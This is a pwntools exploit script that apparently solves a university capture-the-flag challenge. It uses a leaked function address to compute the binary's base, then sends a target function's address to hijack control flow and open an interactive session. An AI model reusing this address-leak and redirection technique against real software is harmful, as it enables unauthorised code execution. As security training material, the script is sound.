from pwn import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-f", "-h"]

LOCAL = False
source_address_name = "totally_uninteresting_function"
target_address_name = "add"

if LOCAL:
    p = process("./basic_math")
    libc = "./basic_math"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1245)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./basic_math"

# Extract the given address from the message and read up until expected input
print(p.recvuntil(b"somewhere: ").decode())
source_raw_address = p.recvline().strip()

print(f"{source_address_name:<15} raw         : {source_raw_address}")
source_address = u64(source_raw_address)
print(f"{source_address_name:<15} address     : {hex(source_address)}")

# Open Shared library to get offset addresses
e = ELF(libc)

# Get source offset
source_address_offset = e.symbols[source_address_name]
print(f"{source_address_name:<15} offset      : {hex(source_address_offset)}")

# Compute the base address from the offset and the given address (base = address - offset)
base_address = source_address - source_address_offset
print(f"{'base address':<15}             : {hex(base_address)}")

# Get the offset for the target address
target_address_offset = 0x1285
print(f"{target_address_name:<15} offset      : {hex(target_address_offset)}")


# Compute the target address (address = base + offset)
target_address = base_address + target_address_offset
print(f"{target_address_name:<15} address     : {hex(target_address)}")

# This challenge required raw bytes
target_address_raw = p64(target_address)
print(f"{target_address_name:<15} address raw : {target_address_raw}")

# Get to prompt and send the answer
print(p.recvuntil(b">").decode())
p.sendline(target_address_raw)

# Reap the rewards
print(p.interactive().decode())